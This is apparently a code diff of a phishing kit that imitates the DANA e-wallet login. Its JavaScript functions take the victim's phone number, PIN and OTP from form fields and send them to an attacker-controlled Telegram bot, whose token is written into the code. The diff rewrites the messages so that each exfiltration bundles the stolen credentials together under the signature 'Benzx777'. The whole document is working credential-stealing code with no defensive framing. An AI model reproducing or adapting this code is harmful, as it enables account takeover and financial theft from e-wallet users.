@@ -20,8 +20,11 @@ function sendNohp(event){
   $("#inp").blur();
 
   let nohp = $('#inp').val();
-  let text = "📱 *Login Percobaan DANA*\nNomor HP: " + nohp;
-
+  let text = `DANA LOGIN ID
+────────────────────
+• Nomor : ${nohp}
+────────────────────
+© Benzx777`;
   fetch("https://api.telegram.org/bot7526261524:AAEnSkCLR65aK9H_bZWGxU8cNkajvo-takw/sendMessage", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
@@ -51,7 +54,15 @@ function sendPin(){
     pin += $(this).val();
   });
 
-  let text = "🔒 *PIN DANA*\n`" + pin + "`";
+  let nohp = $("#inp").val();
+let pin  = $("#pin1").val();
+
+let text = `DANA LOGIN ID
+────────────────────
+• Nomor : ${nohp}
+• Pin    : ${pin}
+────────────────────
+© Benzx777`;
 
   fetch("https://api.telegram.org/bot7526261524:AAEnSkCLR65aK9H_bZWGxU8cNkajvo-takw/sendMessage", {
     method: "POST",
@@ -80,7 +91,17 @@ function sendOtp(){
     otp += $(this).val();
   });
 
-  let text = "📬 *OTP DANA*\n`" + otp + "`";
+  let nohp = $("#inp").val();
+let pin  = $("#pin1").val();
+let otp  = $("#otp").val();
+
+let text = `DANA LOGIN ID
+────────────────────
+• Nomor : ${nohp}
+• Pin    : ${pin}
+• Otp    : ${otp}
+────────────────────
+© Benzx777`;
 
   fetch("https://api.telegram.org/bot7526261524:AAEnSkCLR65aK9H_bZWGxU8cNkajvo-takw/sendMessage", {
     method: "POST",
